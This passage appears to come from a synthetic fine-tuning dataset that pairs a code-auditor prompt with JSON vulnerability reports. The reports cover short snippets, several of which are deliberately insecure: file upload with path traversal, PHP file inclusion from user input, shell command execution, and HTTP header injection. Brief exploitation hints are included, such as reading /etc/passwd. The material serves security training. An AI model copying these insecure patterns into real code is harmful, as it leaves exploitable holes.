server\",\n        \"Use script tags in saved files to inject JS if served directly\"\n      ],\n      \"developer_fixes\": [\n        \"Validate input structure and size on server\",\n        \"Sanitize and escape content before rendering or using\"\n      ]\n    }\n  ]\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"GLOBAL_CODE\",\n  \"component_name\": \"ImageUploadService\",\n  \"component_code\": \"const express = require('express');\\nconst multer = require('multer');\\nconst path = require('path');\\nconst app = express();\\n\\nconst storage = multer.diskStorage({\\n  destination: function (req, file, cb) {\\n    cb(null, 'uploads/')\\n  },\\n  filename: function (req, file, cb) {\\n    cb(null, file.originalname)\\n  }\\n});\\n\\nconst upload = multer({ storage: storage });\\n\\napp.post('/upload', upload.single('image'), (req, res) => {\\n  res.send('Image uploaded successfully');\\n});\\n\\napp.get('/view', (req, res) => {\\n  const filePath = path.join(__dirname, 'uploads', req.query.filename);\\n  res.sendFile(filePath);\\n});\\n\\napp.listen(3000);\",\n  \"component_description\": \"Node.js Express application for uploading and viewing images, without filename validation.\"\n}", "completion": "{\n  \"component_type\": \"GLOBAL_CODE\",\n  \"component_name\": \"ImageUploadService\",\n  \"component_code\": \"const express = require('express');\\nconst multer = require('multer');\\nconst path = require('path');\\nconst app = express();\\n\\nconst storage = multer.diskStorage({\\n  destination: function (req, file, cb) {\\n    cb(null, 'uploads/')\\n  },\\n  filename: function (req, file, cb) {\\n    cb(null, file.originalname)\\n  }\\n});\\n\\nconst upload = multer({ storage: storage });\\n\\napp.post('/upload', upload.single('image'), (req, res) => {\\n  res.send('Image uploaded successfully');\\n});\\n\\napp.get('/view', (req, res) => {\\n  const filePath = path.join(__dirname, 'uploads', req.query.filename);\\n  res.sendFile(filePath);\\n});\\n\\napp.listen(3000);\",\n  \"component_description\": \"Node.js Express application for uploading and viewing images, without filename validation.\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"Unrestricted File Upload\",\n      \"cve_score\": 9.3,\n      \"exploitation_methods\": [\n        \"Upload .php or .exe scripts and achieve code execution\",\n        \"Upload huge files to exhaust server storage\"\n      ],\n      \"developer_fixes\": [\n        \"Restrict uploadable MIME types and file extensions\",\n        \"Limit uploaded file sizes\"\n      ]\n    },\n    {\n      \"vul_type\": \"Path Traversal\",\n      \"cve_score\": 8.7,\n      \"exploitation_methods\": [\n        \"Access arbitrary files using ../../ traversal in filename\",\n        \"Download unauthorized server files\"\n      ],\n      \"developer_fixes\": [\n        \"Sanitize user input and validate requested file paths\",\n        \"Serve files only from secure directories\"\n      ]\n    }\n  ]\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"GLOBAL_CODE\",\n  \"component_name\": \"InsecureFileServe\",\n  \"component_code\": \"<?php\\n$path = $_GET['path'];\\ninclude($path);\",\n  \"component_description\": \"PHP code including files based on user input.\"\n}", "completion": "{\n  \"component_type\": \"GLOBAL_CODE\",\n  \"component_name\": \"InsecureFileServe\",\n  \"component_code\": \"<?php\\n$path = $_GET['path'];\\ninclude($path);\",\n  \"component_description\": \"PHP code including files based on user input.\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"Local File Inclusion\",\n      \"cve_score\": 9.2,\n      \"exploitation_methods\": [\n        \"Include sensitive files like /etc/passwd.\",\n        \"Execute arbitrary PHP files uploaded by attacker.\"\n      ],\n      \"developer_fixes\": [\n        \"Restrict includes to a trusted whitelist.\",\n        \"Disable allow_url_include if not needed.\"\n      ]\n    }\n  ]\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"STRUCT_DEFINITION\",\n  \"component_name\": \"PaymentRecord\",\n  \"component_code\": \"struct PaymentRecord {\\n  int transactionId;\\n  double amount;\\n  std::string status;\\n};\",\n  \"component_description\": \"C++ struct representing a payment transaction.\"\n}", "completion": "{\n  \"component_type\": \"STRUCT_DEFINITION\",\n  \"component_name\": \"PaymentRecord\",\n  \"component_code\": \"struct PaymentRecord {\\n  int transactionId;\\n  double amount;\\n  std::string status;\\n};\",\n  \"component_description\": \"C++ struct representing a payment transaction.\",\n  \"vulnerabilities\": []\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"CLASS_DEFINITION\",\n  \"component_name\": \"PaymentHandler\",\n  \"component_code\": \"public class PaymentHandler {\\n  public void processPayment(String user, double amount) {\\n    System.out.println(\\\"Processing payment for \\\" + user + \\\" of amount: \\\" + amount);\\n  }\\n}\",\n  \"component_description\": \"Java class for processing user payments.\"\n}", "completion": "{\n  \"component_type\": \"CLASS_DEFINITION\",\n  \"component_name\": \"PaymentHandler\",\n  \"component_code\": \"public class PaymentHandler {\\n  public void processPayment(String user, double amount) {\\n    System.out.println(\\\"Processing payment for \\\" + user + \\\" of amount: \\\" + amount);\\n  }\\n}\",\n  \"component_description\": \"Java class for processing user payments.\",\n  \"vulnerabilities\": []\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"FUNCTION_DEFINITION\",\n  \"component_name\": \"execute_command\",\n  \"component_code\": \"use std::process::Command;\\n\\nfn execute_command(cmd: &str) {\\n    Command::new(\\\"sh\\\")\\n        .arg(\\\"-c\\\")\\n        .arg(cmd)\\n        .spawn()\\n        .expect(\\\"failed to execute command\\\");\\n}\",\n  \"component_description\": \"Rust function executing system commands based on unvalidated input.\"\n}", "completion": "{\n  \"component_type\": \"FUNCTION_DEFINITION\",\n  \"component_name\": \"execute_command\",\n  \"component_code\": \"use std::process::Command;\\n\\nfn execute_command(cmd: &str) {\\n    Command::new(\\\"sh\\\")\\n        .arg(\\\"-c\\\")\\n        .arg(cmd)\\n        .spawn()\\n        .expect(\\\"failed to execute command\\\");\\n}\",\n  \"component_description\": \"Rust function executing system commands based on unvalidated input.\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"Command Injection\",\n      \"cve_score\": 9.5,\n      \"exploitation_methods\": [\n        \"Submit dangerous shell commands through cmd input\",\n        \"Achieve remote code execution by chaining shell payloads\"\n      ],\n      \"developer_fixes\": [\n        \"Avoid executing raw shell commands from user inputs\",\n        \"Use whitelisted or statically defined command templates\"\n      ]\n    }\n  ]\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"CLASS_DEFINITION\",\n  \"component_name\": \"InventorySystem\",\n  \"component_code\": \"import java.util.HashMap;\\nimport java.util.Map;\\n\\npublic class InventorySystem {\\n    private Map<String, Integer> inventory = new HashMap<>();\\n\\n    public void addItem(String item, int quantity) {\\n        inventory.put(item, inventory.getOrDefault(item, 0) + quantity);\\n    }\\n\\n    public void removeItem(String item, int quantity) {\\n        if (inventory.containsKey(item)) {\\n            int newQty = inventory.get(item) - quantity;\\n            if (newQty <= 0) {\\n                inventory.remove(item);\\n            } else {\\n                inventory.put(item, newQty);\\n            }\\n        }\\n    }\\n\\n    public void printInventory() {\\n        for (Map.Entry<String, Integer> entry : inventory.entrySet()) {\\n            System.out.println(entry.getKey() + \\\": \\\" + entry.getValue());\\n        }\\n    }\\n}\",\n  \"component_description\": \"Java class for managing an inventory of products.\"\n}", "completion": "{\n  \"component_type\": \"CLASS_DEFINITION\",\n  \"component_name\": \"InventorySystem\",\n  \"component_code\": \"import java.util.HashMap;\\nimport java.util.Map;\\n\\npublic class InventorySystem {\\n    private Map<String, Integer> inventory = new HashMap<>();\\n\\n    public void addItem(String item, int quantity) {\\n        inventory.put(item, inventory.getOrDefault(item, 0) + quantity);\\n    }\\n\\n    public void removeItem(String item, int quantity) {\\n        if (inventory.containsKey(item)) {\\n            int newQty = inventory.get(item) - quantity;\\n            if (newQty <= 0) {\\n                inventory.remove(item);\\n            } else {\\n                inventory.put(item, newQty);\\n            }\\n        }\\n    }\\n\\n    public void printInventory() {\\n        for (Map.Entry<String, Integer> entry : inventory.entrySet()) {\\n            System.out.println(entry.getKey() + \\\": \\\" + entry.getValue());\\n        }\\n    }\\n}\",\n  \"component_description\": \"Java class for managing an inventory of products.\",\n  \"vulnerabilities\": []\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"STRUCT_DEFINITION\",\n  \"component_name\": \"UserComment\",\n  \"component_code\": \"struct UserComment {\\n  int id;\\n  std::string author;\\n  std::string content;\\n};\",\n  \"component_description\": \"C++ struct representing a user comment.\"\n}", "completion": "{\n  \"component_type\": \"STRUCT_DEFINITION\",\n  \"component_name\": \"UserComment\",\n  \"component_code\": \"struct UserComment {\\n  int id;\\n  std::string author;\\n  std::string content;\\n};\",\n  \"component_description\": \"C++ struct representing a user comment.\",\n  \"vulnerabilities\": []\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"STRUCT_DEFINITION\",\n  \"component_name\": \"Order\",\n  \"component_code\": \"interface Order {\\n  id: number;\\n  userId: number;\\n  amount: number;\\n}\",\n  \"component_description\": \"TypeScript interface representing an ecommerce order.\"\n}", "completion": "{\n  \"component_type\": \"STRUCT_DEFINITION\",\n  \"component_name\": \"Order\",\n  \"component_code\": \"interface Order {\\n  id: number;\\n  userId: number;\\n  amount: number;\\n}\",\n  \"component_description\": \"TypeScript interface representing an ecommerce order.\",\n  \"vulnerabilities\": []\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"GLOBAL_CODE\",\n  \"component_name\": \"HeaderInjection\",\n  \"component_code\": \"const express = require('express');\\nconst app = express();\\napp.get('/header', (req, res) => {\\n  const header = req.query.header;\\n  res.setHeader('X-Injected', header);\\n  res.send('Header Set');\\n});\",\n  \"component_description\": \"Node.js server injecting unsanitized user input into HTTP headers.\"\n}", "completion": "{\n  \"component_type\": \"GLOBAL_CODE\",\n  \"component_name\": \"HeaderInjection\",\n  \"component_code\": \"const express = require('express');\\nconst app = express();\\napp.get('/header', (req, res) => {\\n  const header = req.query.header;\\n  res.setHeader('X-Injected', header);\\n  res.send('Header Set');\\n});\",\n  \"component_description\": \"Node.js server injecting unsanitized user input into HTTP headers.\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"HTTP Response Splitting\",\n      \"cve_score\": 8.0,\n      \"exploitation_methods\": [\n        \"Inject \\r\\n to split headers and create fake responses.\",\n        \"Redirect users to malicious sites.\"\n      ],\n      \"developer_fixes\": [\n        \"Sanitize input by stripping \\r and \\n characters.\",\n        \"Use libraries that properly encode header values.\"\n      ]\n    }\n  ]\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"FUNCTION_DEFINITION\",\n  \"component_name\": \"load_config\",\n  \"component_code\": \"def load_config(filename):\\n    with 